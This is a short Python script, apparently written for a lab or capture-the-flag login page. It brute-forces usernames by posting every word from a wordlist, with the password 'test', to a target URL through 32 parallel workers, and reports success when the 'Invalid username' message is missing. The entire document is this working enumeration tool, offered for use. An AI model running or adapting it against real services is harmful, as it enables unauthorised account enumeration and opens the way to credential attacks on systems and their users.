#!/bin/python3
import sys
import requests
from multiprocessing import Pool

testString = "Invalid username"
url = sys.argv[1]
wordFile = open(sys.argv[3],encoding="ISO-8859-1")
words = [word.strip() for word in wordFile.readlines()]
cookies = dict(session = sys.argv[2])

def main():
    with Pool(processes = 32) as pool:
        pool.map(testWord,words)

def testWord(word):
    r = requests.post(url,cookies = cookies, data = { "username":word, "password":"test" })
    if(testString in r.text):
        print("Trying: \"%s\", Failed" % word)
    else:
        print("Trying: \"%s\", Success" % word)
        sys.exit()

main()
